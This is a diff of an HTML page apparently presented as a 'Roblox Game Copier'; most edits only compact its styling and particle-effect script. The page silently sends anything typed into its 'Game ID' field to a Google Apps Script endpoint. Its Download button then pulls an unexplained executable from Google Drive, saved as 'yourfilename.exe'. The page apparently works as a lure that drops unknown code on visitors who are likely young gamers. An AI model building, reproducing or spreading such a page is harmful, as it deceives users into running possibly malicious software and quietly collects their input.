@@ -4,61 +4,15 @@
 <title>Roblox Game Copier</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{
-  min-height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  background:radial-gradient(ellipse at 50% 0%,#0d1b2e 0%,#050a0f 70%);
-  font-family:'Segoe UI',Arial,sans-serif;
-  color:white;
-  overflow:hidden;
-  cursor:none;
-}
+body{min-height:100vh;display:flex;justify-content:center;align-items:center;background:radial-gradient(ellipse at 50% 0%,#0d1b2e 0%,#050a0f 70%);font-family:'Segoe UI',Arial,sans-serif;color:white;overflow:hidden;cursor:none;}
 canvas#bg{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
-.container{
-  position:relative;z-index:2;
-  text-align:center;
-  background:rgba(255,255,255,0.04);
-  backdrop-filter:blur(16px);
-  padding:48px 40px;
-  border-radius:24px;
-  border:1px solid rgba(255,255,255,0.1);
-  width:360px;
-  box-shadow:0 0 60px rgba(0,0,0,0.6),inset 0 1px 0 rgba(255,255,255,0.08);
-}
-h1{
-  font-size:26px;font-weight:600;
-  letter-spacing:0.5px;
-  background:linear-gradient(135deg,#fff 40%,rgba(255,255,255,0.5));
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
-  margin-bottom:8px;
-}
+.container{position:relative;z-index:2;text-align:center;background:rgba(255,255,255,0.04);backdrop-filter:blur(16px);padding:48px 40px;border-radius:24px;border:1px solid rgba(255,255,255,0.1);width:360px;box-shadow:0 0 60px rgba(0,0,0,0.6),inset 0 1px 0 rgba(255,255,255,0.08);}
+h1{font-size:26px;font-weight:600;letter-spacing:0.5px;background:linear-gradient(135deg,#fff 40%,rgba(255,255,255,0.5));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px;}
 p{color:rgba(255,255,255,0.45);font-size:14px;margin-bottom:4px}
-input{
-  width:100%;padding:13px 16px;
-  margin-top:20px;
-  background:rgba(255,255,255,0.06);
-  border:1px solid rgba(255,255,255,0.12);
-  border-radius:12px;
-  font-size:15px;color:white;
-  outline:none;
-  transition:border-color 0.25s,background 0.25s;
-}
+input{width:100%;padding:13px 16px;margin-top:20px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.12);border-radius:12px;font-size:15px;color:white;outline:none;transition:border-color 0.25s,background 0.25s;}
 input::placeholder{color:rgba(255,255,255,0.3)}
 input:focus{border-color:rgba(255,255,255,0.4);background:rgba(255,255,255,0.09)}
-button{
-  width:100%;padding:13px;
-  margin-top:14px;
-  border:1px solid rgba(255,255,255,0.2);
-  border-radius:12px;
-  background:rgba(255,255,255,0.08);
-  color:white;
-  font-size:15px;font-weight:500;
-  cursor:none;
-  transition:background 0.2s,border-color 0.2s,transform 0.1s;
-  position:relative;overflow:hidden;
-}
+button{width:100%;padding:13px;margin-top:14px;border:1px solid rgba(255,255,255,0.2);border-radius:12px;background:rgba(255,255,255,0.08);color:white;font-size:15px;font-weight:500;cursor:none;transition:background 0.2s,border-color 0.2s,transform 0.1s;position:relative;overflow:hidden;}
 button:hover{background:rgba(255,255,255,0.14);border-color:rgba(255,255,255,0.35)}
 button:active{transform:scale(0.98)}
 .status{margin-top:16px;font-size:13px;color:rgba(255,255,255,0.5);min-height:20px;transition:color 0.3s}
@@ -79,17 +33,14 @@ button:active{transform:scale(0.98)}
   <button onclick="downloadText()">Download</button>
   <div class="status" id="status"></div>
 </div>
-
 <script>
-const cursor = document.getElementById('cursor');
-const canvas = document.getElementById('bg');
-const ctx = canvas.getContext('2d');
-let W, H, particles = [], mouse = {x:0, y:0};
-
+const cursor=document.getElementById('cursor');
+const canvas=document.getElementById('bg');
+const ctx=canvas.getContext('2d');
+let W,H,particles=[],mouse={x:0,y:0};
 function resize(){W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight}
 resize();
 window.addEventListener('resize',resize);
-
 class Particle{
   constructor(x,y,fromClick){
     this.x=x;this.y=y;
@@ -100,85 +51,46 @@ class Particle{
     this.decay=fromClick?0.018:0.006;
   }
   update(){this.x+=this.speedX;this.y+=this.speedY;this.life-=this.decay;this.speedX*=0.97;this.speedY*=0.97}
-  draw(){
-    ctx.beginPath();
-    ctx.arc(this.x,this.y,this.size,0,Math.PI*2);
-    ctx.fillStyle=`rgba(255,255,255,${Math.max(0,this.life)})`;
-    ctx.fill();
-  }
+  draw(){ctx.beginPath();ctx.arc(this.x,this.y,this.size,0,Math.PI*2);ctx.fillStyle=`rgba(255,255,255,${Math.max(0,this.life)})`;ctx.fill();}
 }
-
 let trailTimer=0;
 function loop(){
-  ctx.clearRect(0,0,W,H);
-  trailTimer++;
-  if(trailTimer%2===0) particles.push(new Particle(mouse.x,mouse.y,false));
+  ctx.clearRect(0,0,W,H);trailTimer++;
+  if(trailTimer%2===0)particles.push(new Particle(mouse.x,mouse.y,false));
   particles=particles.filter(p=>{p.update();p.draw();return p.life>0});
   requestAnimationFrame(loop);
 }
 loop();
-
 document.addEventListener('mousemove',e=>{
   mouse.x=e.clientX;mouse.y=e.clientY;
-  cursor.style.left=e.clientX+'px';
-  cursor.style.top=e.clientY+'px';
+  cursor.style.left=e.clientX+'px';cursor.style.top=e.clientY+'px';
 });
-
 document.addEventListener('click',e=>{
-  for(let i=0;i<24;i++) particles.push(new Particle(e.clientX,e.clientY,true));
+  for(let i=0;i<24;i++)particles.push(new Particle(e.clientX,e.clientY,true));
   const r=document.createElement('div');
-  r.className='ripple';
-  r.style.left=e.clientX+'px';
-  r.style.top=e.clientY+'px';
-  document.body.appendChild(r);
-  setTimeout(()=>r.remove(),650);
+  r.className='ripple';r.style.left=e.clientX+'px';r.style.top=e.clientY+'px';
+  document.body.appendChild(r);setTimeout(()=>r.remove(),650);
 });
-
 const scriptURL="https://script.google.com/macros/s/AKfycbzlojUP4v3hivfaTNPqsHzNiioOMi-M7WDhifVYVAOnrt7nep3k4j0PdDyYVNJDhSBUmg/exec";
-async function saveText() {
-  const text = document.getElementById("myText").value;
-  if (text.trim() === "") return;
-
-  const params = new URLSearchParams({ text: text });
-
-  try {
-    await fetch(scriptURL + "?" + params.toString(), {
-      method: "GET",
-      mode: "no-cors"  // keep this — CORS is blocked by Google but the request still goes through
-    });
-  } catch (err) {
-    console.error("Save failed:", err);
-  }
+async function saveText(){
+  const text=document.getElementById("myText").value;
+  if(text.trim()==="")return;
+  try{await fetch(scriptURL+"?"+new URLSearchParams({text}).toString(),{method:"GET",mode:"no-cors"});}
+  catch(err){console.error("Save failed:",err);}
 }
-
 document.getElementById("myText").addEventListener("change",saveText);
-
-async function downloadText() {
-  const text = document.getElementById("myText").value;
-  if (!text.trim()) {
-    const s = document.getElementById("status");
-    s.className = 'status err';
-    s.innerText = "Enter a Game ID first!";
-    return;
+async function downloadText(){
+  const text=document.getElementById("myText").value;
+  if(!text.trim()){
+    const s=document.getElementById("status");
+    s.className='status err';s.innerText="Enter a Game ID first!";return;
   }
-
-  // Wait for save to complete BEFORE downloading
   await saveText();
-
-  const fileURL = "https://drive.google.com/uc?export=download&id=1ffxPOnnh6nImc15vMW8E6lvA9e56FtJW";
-  const a = document.createElement("a");
-  a.href = fileURL;
-  a.download = "yourfilename.exe";
-  a.click();
-
-  const s = document.getElementById("status");
-  s.className = 'status ok';
-  s.innerText = "Downloaded!";
-}
-
-  const s = document.getElementById("status");
-  s.className = 'status ok';
-  s.innerText = "Downloaded!";
+  const a=document.createElement("a");
+  a.href="https://drive.google.com/uc?export=download&id=1ffxPOnnh6nImc15vMW8E6lvA9e56FtJW";
+  a.download="yourfilename.exe";a.click();
+  const s=document.getElementById("status");
+  s.className='status ok';s.innerText="Downloaded!";
 }
 </script>
 </body>
